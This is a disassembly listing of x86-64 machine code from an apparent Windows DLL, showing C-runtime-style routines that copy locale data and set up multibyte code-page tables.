   180007cdb:	33 c9                	xor    %ecx,%ecx
   180007cdd:	e8 8e ed ff ff       	call   0x180006a70
   180007ce2:	83 c8 ff             	or     $0xffffffff,%eax
   180007ce5:	e9 dd 01 00 00       	jmp    0x180007ec7
   180007cea:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180007cf1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180007cf6:	ba 04 00 00 00       	mov    $0x4,%edx
   180007cfb:	44 8b c2             	mov    %edx,%r8d
   180007cfe:	48 8b 80 88 00 00 00 	mov    0x88(%rax),%rax
   180007d05:	44 8d 4a 7c          	lea    0x7c(%rdx),%r9d
   180007d09:	0f 10 00             	movups (%rax),%xmm0
   180007d0c:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180007d10:	0f 11 01             	movups %xmm0,(%rcx)
   180007d13:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180007d17:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180007d1b:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180007d1f:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180007d23:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180007d27:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180007d2b:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180007d2f:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180007d33:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180007d37:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180007d3b:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180007d3f:	49 03 c1             	add    %r9,%rax
   180007d42:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180007d46:	49 03 c9             	add    %r9,%rcx
   180007d49:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180007d4d:	49 83 e8 01          	sub    $0x1,%r8
   180007d51:	75 b6                	jne    0x180007d09
   180007d53:	0f 10 00             	movups (%rax),%xmm0
   180007d56:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180007d5a:	48 8b 40 20          	mov    0x20(%rax),%rax
   180007d5e:	0f 11 01             	movups %xmm0,(%rcx)
   180007d61:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180007d65:	48 89 41 20          	mov    %rax,0x20(%rcx)
   180007d69:	48 8b cb             	mov    %rbx,%rcx
   180007d6c:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   180007d71:	0f 10 00             	movups (%rax),%xmm0
   180007d74:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180007d78:	0f 11 01             	movups %xmm0,(%rcx)
   180007d7b:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180007d7f:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180007d83:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180007d87:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180007d8b:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180007d8f:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180007d93:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180007d97:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180007d9b:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180007d9f:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180007da3:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180007da7:	49 03 c1             	add    %r9,%rax
   180007daa:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180007dae:	49 03 c9             	add    %r9,%rcx
   180007db1:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180007db5:	48 83 ea 01          	sub    $0x1,%rdx
   180007db9:	75 b6                	jne    0x180007d71
   180007dbb:	0f 10 00             	movups (%rax),%xmm0
   180007dbe:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180007dc2:	48 8b 40 20          	mov    0x20(%rax),%rax
   180007dc6:	0f 11 01             	movups %xmm0,(%rcx)
   180007dc9:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180007dcd:	48 89 41 20          	mov    %rax,0x20(%rcx)
   180007dd1:	8b cf                	mov    %edi,%ecx
   180007dd3:	21 13                	and    %edx,(%rbx)
   180007dd5:	48 8b d3             	mov    %rbx,%rdx
   180007dd8:	e8 37 02 00 00       	call   0x180008014
   180007ddd:	83 cf ff             	or     $0xffffffff,%edi
   180007de0:	8b f0                	mov    %eax,%esi
   180007de2:	3b c7                	cmp    %edi,%eax
   180007de4:	75 1a                	jne    0x180007e00
   180007de6:	e8 09 e3 ff ff       	call   0x1800060f4
   180007deb:	48 8b cb             	mov    %rbx,%rcx
   180007dee:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180007df4:	e8 77 ec ff ff       	call   0x180006a70
   180007df9:	8b c7                	mov    %edi,%eax
   180007dfb:	e9 c7 00 00 00       	jmp    0x180007ec7
   180007e00:	45 84 f6             	test   %r14b,%r14b
   180007e03:	75 05                	jne    0x180007e0a
   180007e05:	e8 8a ea ff ff       	call   0x180006894
   180007e0a:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180007e11:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   180007e18:	8b c7                	mov    %edi,%eax
   180007e1a:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   180007e1e:	03 c7                	add    %edi,%eax
   180007e20:	75 1f                	jne    0x180007e41
   180007e22:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180007e29:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   180007e30:	48 8d 05 d9 23 01 00 	lea    0x123d9(%rip),%rax        # 0x18001a210
   180007e37:	48 3b c8             	cmp    %rax,%rcx
   180007e3a:	74 05                	je     0x180007e41
   180007e3c:	e8 2f ec ff ff       	call   0x180006a70
   180007e41:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   180007e47:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180007e4e:	48 89 98 88 00 00 00 	mov    %rbx,0x88(%rax)
   180007e55:	48 8b 85 a0 01 00 00 	mov    0x1a0(%rbp),%rax
   180007e5c:	8b 88 a8 03 00 00    	mov    0x3a8(%rax),%ecx
   180007e62:	85 0d f0 29 01 00    	test   %ecx,0x129f0(%rip)        # 0x18001a858
   180007e68:	75 54                	jne    0x180007ebe
   180007e6a:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   180007e71:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180007e76:	4c 8d 4c 24 24       	lea    0x24(%rsp),%r9
   180007e7b:	48 8d 85 a8 01 00 00 	lea    0x1a8(%rbp),%rax
   180007e82:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180007e87:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180007e8c:	b8 05 00 00 00       	mov    $0x5,%eax
   180007e91:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   180007e96:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180007e9b:	89 44 24 24          	mov    %eax,0x24(%rsp)
   180007e9f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180007ea3:	e8 e8 f8 ff ff       	call   0x180007790
   180007ea8:	45 84 f6             	test   %r14b,%r14b
   180007eab:	74 11                	je     0x180007ebe
   180007ead:	48 8b 85 a8 01 00 00 	mov    0x1a8(%rbp),%rax
   180007eb4:	48 8b 08             	mov    (%rax),%rcx
   180007eb7:	48 89 0d 42 23 01 00 	mov    %rcx,0x12342(%rip)        # 0x18001a200
   180007ebe:	33 c9                	xor    %ecx,%ecx
   180007ec0:	e8 ab eb ff ff       	call   0x180006a70
   180007ec5:	8b c6                	mov    %esi,%eax
   180007ec7:	4c 8d 9c 24 70 02 00 	lea    0x270(%rsp),%r11
   180007ece:	00 
   180007ecf:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180007ed3:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180007ed7:	49 8b e3             	mov    %r11,%rsp
   180007eda:	41 5e                	pop    %r14
   180007edc:	5f                   	pop    %rdi
   180007edd:	5d                   	pop    %rbp
   180007ede:	c3                   	ret
   180007edf:	cc                   	int3
   180007ee0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180007ee5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180007eea:	57                   	push   %rdi
   180007eeb:	48 83 ec 20          	sub    $0x20,%rsp
   180007eef:	48 8b f2             	mov    %rdx,%rsi
   180007ef2:	48 8b f9             	mov    %rcx,%rdi
   180007ef5:	8b 05 5d 29 01 00    	mov    0x1295d(%rip),%eax        # 0x18001a858
   180007efb:	85 81 a8 03 00 00    	test   %eax,0x3a8(%rcx)
   180007f01:	74 13                	je     0x180007f16
   180007f03:	48 83 b9 90 00 00 00 	cmpq   $0x0,0x90(%rcx)
   180007f0a:	00 
   180007f0b:	74 09                	je     0x180007f16
   180007f0d:	48 8b 99 88 00 00 00 	mov    0x88(%rcx),%rbx
   180007f14:	eb 64                	jmp    0x180007f7a
   180007f16:	b9 05 00 00 00       	mov    $0x5,%ecx
   180007f1b:	e8 f8 e9 ff ff       	call   0x180006918
   180007f20:	90                   	nop
   180007f21:	48 8b 9f 88 00 00 00 	mov    0x88(%rdi),%rbx
   180007f28:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180007f2d:	48 3b 1e             	cmp    (%rsi),%rbx
   180007f30:	74 3e                	je     0x180007f70
   180007f32:	48 85 db             	test   %rbx,%rbx
   180007f35:	74 22                	je     0x180007f59
   180007f37:	83 c8 ff             	or     $0xffffffff,%eax
   180007f3a:	f0 0f c1 03          	lock xadd %eax,(%rbx)
   180007f3e:	83 f8 01             	cmp    $0x1,%eax
   180007f41:	75 16                	jne    0x180007f59
   180007f43:	48 8d 05 c6 22 01 00 	lea    0x122c6(%rip),%rax        # 0x18001a210
   180007f4a:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180007f4f:	48 3b c8             	cmp    %rax,%rcx
   180007f52:	74 05                	je     0x180007f59
   180007f54:	e8 17 eb ff ff       	call   0x180006a70
   180007f59:	48 8b 06             	mov    (%rsi),%rax
   180007f5c:	48 89 87 88 00 00 00 	mov    %rax,0x88(%rdi)
   180007f63:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180007f68:	f0 ff 00             	lock incl (%rax)
   180007f6b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007f70:	b9 05 00 00 00       	mov    $0x5,%ecx
   180007f75:	e8 f2 e9 ff ff       	call   0x18000696c
   180007f7a:	48 85 db             	test   %rbx,%rbx
   180007f7d:	74 13                	je     0x180007f92
   180007f7f:	48 8b c3             	mov    %rbx,%rax
   180007f82:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180007f87:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180007f8c:	48 83 c4 20          	add    $0x20,%rsp
   180007f90:	5f                   	pop    %rdi
   180007f91:	c3                   	ret
   180007f92:	e8 d9 da ff ff       	call   0x180005a70
   180007f97:	90                   	nop
   180007f98:	48 83 ec 28          	sub    $0x28,%rsp
   180007f9c:	80 3d 39 30 01 00 00 	cmpb   $0x0,0x13039(%rip)        # 0x18001afdc
   180007fa3:	75 4c                	jne    0x180007ff1
   180007fa5:	48 8d 0d a4 25 01 00 	lea    0x125a4(%rip),%rcx        # 0x18001a550
   180007fac:	48 89 0d 15 30 01 00 	mov    %rcx,0x13015(%rip)        # 0x18001afc8
   180007fb3:	48 8d 05 56 22 01 00 	lea    0x12256(%rip),%rax        # 0x18001a210
   180007fba:	48 8d 0d 7f 24 01 00 	lea    0x1247f(%rip),%rcx        # 0x18001a440
   180007fc1:	48 89 05 08 30 01 00 	mov    %rax,0x13008(%rip)        # 0x18001afd0
   180007fc8:	48 89 0d f1 2f 01 00 	mov    %rcx,0x12ff1(%rip)        # 0x18001afc0
   180007fcf:	e8 e0 e5 ff ff       	call   0x1800065b4
   180007fd4:	4c 8d 0d f5 2f 01 00 	lea    0x12ff5(%rip),%r9        # 0x18001afd0
   180007fdb:	4c 8b c0             	mov    %rax,%r8
   180007fde:	b2 01                	mov    $0x1,%dl
   180007fe0:	b9 fd ff ff ff       	mov    $0xfffffffd,%ecx
   180007fe5:	e8 86 fc ff ff       	call   0x180007c70
   180007fea:	c6 05 eb 2f 01 00 01 	movb   $0x1,0x12feb(%rip)        # 0x18001afdc
   180007ff1:	b0 01                	mov    $0x1,%al
   180007ff3:	48 83 c4 28          	add    $0x28,%rsp
   180007ff7:	c3                   	ret
   180007ff8:	48 83 ec 28          	sub    $0x28,%rsp
   180007ffc:	e8 97 e5 ff ff       	call   0x180006598
   180008001:	48 8d 15 c8 2f 01 00 	lea    0x12fc8(%rip),%rdx        # 0x18001afd0
   180008008:	48 8b c8             	mov    %rax,%rcx
   18000800b:	48 83 c4 28          	add    $0x28,%rsp
   18000800f:	e9 cc fe ff ff       	jmp    0x180007ee0
   180008014:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180008019:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000801e:	56                   	push   %rsi
   18000801f:	57                   	push   %rdi
   180008020:	41 54                	push   %r12
   180008022:	41 56                	push   %r14
   180008024:	41 57                	push   %r15
   180008026:	48 83 ec 40          	sub    $0x40,%rsp
   18000802a:	48 8b 05 cf 1f 01 00 	mov    0x11fcf(%rip),%rax        # 0x18001a000
   180008031:	48 33 c4             	xor    %rsp,%rax
   180008034:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180008039:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000803c:	33 c0                	xor    %eax,%eax
   18000803e:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   180008043:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180008047:	48 8b f2             	mov    %rdx,%rsi
   18000804a:	e8 11 f9 ff ff       	call   0x180007960
   18000804f:	33 db                	xor    %ebx,%ebx
   180008051:	8b f8                	mov    %eax,%edi
   180008053:	85 c0                	test   %eax,%eax
   180008055:	0f 84 51 02 00 00    	je     0x1800082ac
   18000805b:	4c 8d 25 fe 25 01 00 	lea    0x125fe(%rip),%r12        # 0x18001a660
   180008062:	44 8b f3             	mov    %ebx,%r14d
   180008065:	49 8b c4             	mov    %r12,%rax
   180008068:	8d 6b 01             	lea    0x1(%rbx),%ebp
   18000806b:	39 38                	cmp    %edi,(%rax)
   18000806d:	0f 84 46 01 00 00    	je     0x1800081b9
   180008073:	44 03 f5             	add    %ebp,%r14d
   180008076:	48 83 c0 30          	add    $0x30,%rax
   18000807a:	41 83 fe 05          	cmp    $0x5,%r14d
   18000807e:	72 eb                	jb     0x18000806b
   180008080:	81 ff e8 fd 00 00    	cmp    $0xfde8,%edi
   180008086:	0f 84 25 01 00 00    	je     0x1800081b1
   18000808c:	0f b7 cf             	movzwl %di,%ecx
   18000808f:	ff 15 d3 70 00 00    	call   *0x70d3(%rip)        # 0x18000f168
   180008095:	85 c0                	test   %eax,%eax
   180008097:	0f 84 14 01 00 00    	je     0x1800081b1
   18000809d:	b8 e9 fd 00 00       	mov    $0xfde9,%eax
   1800080a2:	3b f8                	cmp    %eax,%edi
   1800080a4:	75 26                	jne    0x1800080cc
   1800080a6:	48 89 46 04          	mov    %rax,0x4(%rsi)
   1800080aa:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   1800080b1:	89 5e 18             	mov    %ebx,0x18(%rsi)
   1800080b4:	66 89 5e 1c          	mov    %bx,0x1c(%rsi)
   1800080b8:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   1800080bc:	0f b7 c3             	movzwl %bx,%eax
   1800080bf:	b9 06 00 00 00       	mov    $0x6,%ecx
   1800080c4:	66 f3 ab             	rep stos %ax,(%rdi)
   1800080c7:	e9 d6 01 00 00       	jmp    0x1800082a2
   1800080cc:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800080d1:	8b cf                	mov    %edi,%ecx
   1800080d3:	ff 15 a7 70 00 00    	call   *0x70a7(%rip)        # 0x18000f180
   1800080d9:	85 c0                	test   %eax,%eax
   1800080db:	0f 84 c4 00 00 00    	je     0x1800081a5
   1800080e1:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1800080e5:	33 d2                	xor    %edx,%edx
   1800080e7:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1800080ed:	e8 be 58 00 00       	call   0x18000d9b0
   1800080f2:	83 7c 24 20 02       	cmpl   $0x2,0x20(%rsp)
   1800080f7:	89 7e 04             	mov    %edi,0x4(%rsi)
   1800080fa:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   180008101:	0f 85 94 00 00 00    	jne    0x18000819b
   180008107:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   18000810c:	38 5c 24 26          	cmp    %bl,0x26(%rsp)
   180008110:	74 2c                	je     0x18000813e
   180008112:	38 59 01             	cmp    %bl,0x1(%rcx)
   180008115:	74 27                	je     0x18000813e
   180008117:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   18000811b:	0f b6 11             	movzbl (%rcx),%edx
   18000811e:	3b d0                	cmp    %eax,%edx
   180008120:	77 14                	ja     0x180008136
   180008122:	2b c2                	sub    %edx,%eax
   180008124:	8d 7a 01             	lea    0x1(%rdx),%edi
   180008127:	8d 14 28             	lea    (%rax,%rbp,1),%edx
   18000812a:	80 4c 37 18 04       	orb    $0x4,0x18(%rdi,%rsi,1)
   18000812f:	03 fd                	add    %ebp,%edi
   180008131:	48 2b d5             	sub    %rbp,%rdx
   180008134:	75 f4                	jne    0x18000812a
   180008136:	48 83 c1 02          	add    $0x2,%rcx
   18000813a:	38 19                	cmp    %bl,(%rcx)
   18000813c:	75 d4                	jne    0x180008112
   18000813e:	48 8d 46 1a          	lea    0x1a(%rsi),%rax
   180008142:	b9 fe 00 00 00       	mov    $0xfe,%ecx
   180008147:	80 08 08             	orb    $0x8,(%rax)
   18000814a:	48 03 c5             	add    %rbp,%rax
   18000814d:	48 2b cd             	sub    %rbp,%rcx
   180008150:	75 f5                	jne    0x180008147
   180008152:	8b 4e 04             	mov    0x4(%rsi),%ecx
   180008155:	81 e9 a4 03 00 00    	sub    $0x3a4,%ecx
   18000815b:	74 2e                	je     0x18000818b
   18000815d:	83 e9 04             	sub    $0x4,%ecx
   180008160:	74 20                	je     0x180008182
   180008162:	83 e9 0d             	sub    $0xd,%ecx
   180008165:	74 12                	je     0x180008179
   180008167:	3b cd                	cmp    %ebp,%ecx
   180008169:	74 05                	je     0x180008170
   18000816b:	48 8b c3             	mov    %rbx,%rax
   18000816e:	eb 22                	jmp    0x180008192
   180008170:	48 8b 05 41 8b 00 00 	mov    0x8b41(%rip),%rax        # 0x180010cb8
   180008177:	eb 19                	jmp    0x180008192
   180008179:	48 8b 05 30 8b 00 00 	mov    0x8b30(%rip),%rax        # 0x180010cb0
   180008180:	eb 10                	jmp    0x180008192
   180008182:	48 8b 05 1f 8b 00 00 	mov    0x8b1f(%rip),%rax        # 0x180010ca8
   180008189:	eb 07                	jmp    0x180008192
   18000818b:	48 8b 05 0e 8b 00 00 	mov    0x8b0e(%rip),%rax        # 0x180010ca0
   180008192:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   180008199:	eb 02                	jmp    0x18000819d
   18000819b:	8b eb                	mov    %ebx,%ebp
   18000819d:	89 6e 08             	mov    %ebp,0x8(%rsi)
   1800081a0:	e9 13 ff ff ff       	jmp    0x1800080b8
   1800081a5:	39 1d 2d 2e 01 00    	cmp    %ebx,0x12e2d(%rip)        # 0x18001afd8
   1800081ab:	0f 85 fb 00 00 00    	jne    0x1800082ac
   1800081b1:	83 c8 ff             	or     $0xffffffff,%eax
   1800081b4:	e9 fd 00 00 00       	jmp    0x1800082b6
   1800081b9:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
   1800081bd:	33 d2                	xor    %edx,%edx
   1800081bf:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1800081c5:	e8 e6 57 00 00       	call   0x18000d9b0
   1800081ca:	41 8b c6             	mov    %r14d,%eax
   1800081cd:	4d 8d 4c 24 10       	lea    0x10(%r12),%r9
   1800081d2:	4c 8d 3d 77 24 01 00 	lea    0x12477(%rip),%r15        # 0x18001a650
   1800081d9:	41 be 04 00 00 00    	mov    $0x4,%r14d
   1800081df:	4c 8d 1c 40          	lea    (%rax,%rax,2),%r11
   1800081e3:	49 c1 e3 04          	shl    $0x4,%r11
   1800081e7:	4d 03 cb             	add    %r11,%r9
   1800081ea:	49 8b d1             	mov    %r9,%rdx
   1800081ed:	41 38 19             	cmp    %bl,(%r9)
   1800081f0:	74 3e                	je     0x180008230
   1800081f2:	38 5a 01             	cmp    %bl,0x1(%rdx)
   1800081f5:	74 39                	je     0x180008230
   1800081f7:	44 0f b6 02          	movzbl (%rdx),%r8d
   1800081fb:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1800081ff:	44 3b c0             	cmp    %eax,%r8d
   180008202:	77 24                	ja     0x180008228
   180008204:	45 8d 50 01          	lea    0x1(%r8),%r10d
   180008208:	41 81 fa 01 01 00 00 	cmp    $0x101,%r10d
   18000820f:	73 17                	jae    0x180008228
   180008211:	41 8a 07             	mov    (%r15),%al
   180008214:	44 03 c5             	add    %ebp,%r8d
   180008217:	41 08 44 32 18       	or     %al,0x18(%r10,%rsi,1)
   18000821c:	44 03 d5             	add    %ebp,%r10d
   18000821f:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   180008223:	44 3b c0             	cmp    %eax,%r8d
   180008226:	76 e0                	jbe    0x180008208
   180008228:	48 83 c2 02          	add    $0x2,%rdx
   18000822c:	38 1a                	cmp    %bl,(%rdx)
   18000822e:	75 c2                	jne    0x1800081f2
   180008230:	49 83 c1 08          	add    $0x8,%r9
   180008234:	4c 03 fd             	add    %rbp,%r15
   180008237:	4c 2b f5             	sub    %rbp,%r14
   18000823a:	75 ae                	jne    0x1800081ea
   18000823c:	89 7e 04             	mov    %edi,0x4(%rsi)
   18000823f:	89 6e 08             	mov    %ebp,0x8(%rsi)
   180008242:	81 ef a4 03 00 00    	sub    $0x3a4,%edi
   180008248:	74 29                	je     0x180008273
   18000824a:	83 ef 04             	sub    $0x4,%edi
   18000824d:	74 1b                	je     0x18000826a
   18000824f:	83 ef 0d             	sub    $0xd,%edi
   180008252:	74 0d                	je     0x180008261
   180008254:	3b fd                	cmp    %ebp,%edi
   180008256:	75 22                	jne    0x18000827a
   180008258:	48 8b 1d 59 8a 00 00 	mov    0x8a59(%rip),%rbx        # 0x180010cb8
   18000825f:	eb 19                	jmp    0x18000827a
   180008261:	48 8b 1d 48 8a 00 00 	mov    0x8a48(%rip),%rbx        # 0x180010cb0
   180008268:	eb 10                	jmp    0x18000827a
   18000826a:	48 8b 1d 37 8a 00 00 	mov    0x8a37(%rip),%rbx        # 0x180010ca8
   180008271:	eb 07                	jmp    0x18000827a
   180008273:	48 8b 1d 26 8a 00 00 	mov    0x8a26(%rip),%rbx        # 0x180010ca0
   18000827a:	4c 2b de             	sub    %rsi,%r11
   18000827d:	48 89 9e 20 02 00 00 	mov    %rbx,0x220(%rsi)
   180008284:	48 8d 56 0c          	lea    0xc(%rsi),%rdx
   180008288:	b9 06 00 00 00       	mov    $0x6,%ecx
   18000828d:	4b 8d 3c 23          	lea    (%r11,%r12,1),%rdi
   180008291:	0f b7 44 17 f8       	movzwl -0x8(%rdi,%rdx,1),%eax
   180008296:	66 89 02             	mov    %ax,(%rdx)
   180008299:	48 8d 52 02          	lea    0x2(%rdx),%rdx
   18000829d:	48 2b cd             	sub    %rbp,%rcx
   1800082a0:	75 ef                	jne    0x180008291
   1800082a2:	48 8b ce             	mov    %rsi,%rcx
   1800082a5:	e8 ce f7 ff ff       	call   0x180007a78
   1800082aa:	eb 08                	jmp    0x1800082b4
   1800082ac:	48 8b ce             	mov    %rsi,%rcx
   1800082af:	e8 2c f7 ff ff       	call   0x1800079e0
   1800082b4:	33 c0                	xor    %eax,%eax
   1800082b6:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1800082bb:	48 33 cc             	xor    %rsp,%rcx
   1800082be:	e8 0d 90 ff ff       	call   0x1800012d0
   1800082c3:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   1800082c8:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   1800082cc:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   1800082d0:	49 8b e3             	mov    %r11,%rsp
   1800082d3:	41 5f                	pop    %r15
   1800082d5:	41 5e                	pop    %r14
   1800082d7:	41 5c                	pop    %r12
   1800082d9:	5f                   	pop    %rdi
   1800082da:	5e                   	pop    %rsi
   1800082db:	c3                   	ret
   1800082dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800082e1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800082e6:	57                   	push   %rdi
   1800082e7:	48 83 ec 40          	sub    $0x40,%rsp
   1800082eb:	8b da                	mov    %edx,%ebx
   1800082ed:	41 8b f9             	mov    %r9d,%edi
   1800082f0:	48 8b d1             	mov    %rcx,%rdx
   1800082f3:	41 8b f0             	mov    %r8d,%esi
   1800082f6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800082fb:	e8 40 c6 ff ff       	call   0x180004940
   180008300:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180008305:	0f b6 d3             	movzbl %bl,%edx
   180008308:	40 84 7c 02 19       	test   %dil,0x19(%rdx,%rax,1)
   18000830d:	75 18                	jne    0x180008327
   18000830f:	85 f6                	test   %esi,%esi
   180008311:	74 10                	je     0x180008323
   180008313:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180008318:	48 8b 08             	mov    (%rax),%rcx
   18000831b:	0f b7 04 51          	movzwl (%rcx,%rdx,2),%eax
   18000831f:	85 c6                	test   %eax,%esi
   180008321:	75 04                	jne    0x180008327
   180008323:	33 c0                	xor    %eax,%eax
   180008325:	eb 05                	jmp    0x18000832c
   180008327:	b8 01 00 00 00       	mov    $0x1,%eax
   18000832c:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180008331:	74 0c                	je     0x18000833f
   180008333:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   180008338:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000833f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180008344:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180008349:	48 83 c4 40          	add    $0x40,%rsp
   18000834d:	5f                   	pop    %rdi
   18000834e:	c3                   	ret
   18000834f:	cc                   	int3
   180008350:	8b d1                	mov    %ecx,%edx
   180008352:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180008358:	33 c9                	xor    %ecx,%ecx
   18000835a:	45 33 c0             	xor    %r8d,%r8d
   18000835d:	e9 7a ff ff ff       	jmp    0x1800082dc
   180008362:	cc                   	int3
   180008363:	cc                   	int3
   180008364:	48 83 ec 28          	sub    $0x28,%rsp
   180008368:	ff 15 1a 6e 00 00    	call   *0x6e1a(%rip)        # 0x18000f188
   18000836e:	48 89 05 8b 2c 01 00 	mov    %rax,0x12c8b(%rip)        # 0x18001b000
   180008375:	ff 15 15 6e 00 00    	call   *0x6e15(%rip)        # 0x18000f190
   18000837b:	48 89 05 86 2c 01 00 	mov    %rax,0x12c86(%rip)        # 0x18001b008
   180008382:	b0 01                	mov    $0x1,%al
   180008384:	48 83 c4 28          	add    $0x28,%rsp
   180008388:	c3                   	ret
   180008389:	cc                   	int3
   18000838a:	cc                   	int3
   18000838b:	cc                   	int3
   18000838c:	b8 ac de 00 00       	mov    $0xdeac,%eax
   180008391:	3b c8                	cmp    %eax,%ecx
   180008393:	77 4f                	ja     0x1800083e4
   180008395:	74 44                	je     0x1800083db
   180008397:	b8 33 c4 00 00       	mov    $0xc433,%eax
   18000839c:	3b c8                	cmp    %eax,%ecx
   18000839e:	77 1f                	ja     0x1800083bf
   1800083a0:	74 39                	je     0x1800083db
   1800083a2:	8b c1                	mov    %ecx,%eax
   1800083a4:	83 e8 2a             	sub    $0x2a,%eax
   1800083a7:	74 32                	je     0x1800083db
   1800083a9:	2d 02 c4 00 00       	sub    $0xc402,%eax
   1800083ae:	74 2b                	je     0x1800083db
   1800083b0:	83 e8 01             	sub    $0x1,%eax
   1800083b3:	74 26                	je     0x1800083db
   1800083b5:	83 e8 01             	sub    $0x1,%eax
   1800083b8:	74 21                	je     0x1800083db
   1800083ba:	83 f8 03             	cmp    $0x3,%eax
   1800083bd:	eb 1a                	jmp    0x1800083d9
   1800083bf:	8b c1                	mov    %ecx,%eax
   1800083c1:	2d 35 c4 00 00       	sub    $0xc435,%eax
   1800083c6:	74 13                	je     0x1800083db
   1800083c8:	2d 63 12 00 00       	sub    $0x1263,%eax
   1800083cd:	74 48                	je     0x180008417
   1800083cf:	2d 12 08 00 00       	sub    $0x812,%eax
   1800083d4:	74 05                	je     0x1800083db
   1800083d6:	83 f8 01             	cmp    $0x1,%eax
   1800083d9:	75 02                	jne    0x1800083dd
   1800083db:	33 d2                	xor    %edx,%edx
   1800083dd:	48 ff 25 b4 6d 00 00 	rex.W jmp *0x6db4(%rip)        # 0x18000f198
   1800083e4:	8b c1                	mov    %ecx,%eax
   1800083e6:	2d ad de 00 00       	sub    $0xdead,%eax
   1800083eb:	74 ee                	je     0x1800083db
   1800083ed:	83 e8 01             	sub    $0x1,%eax
   1800083f0:	74 e9                	je     0x1800083db
   1800083f2:	83 e8 01             	sub    $0x1,%eax
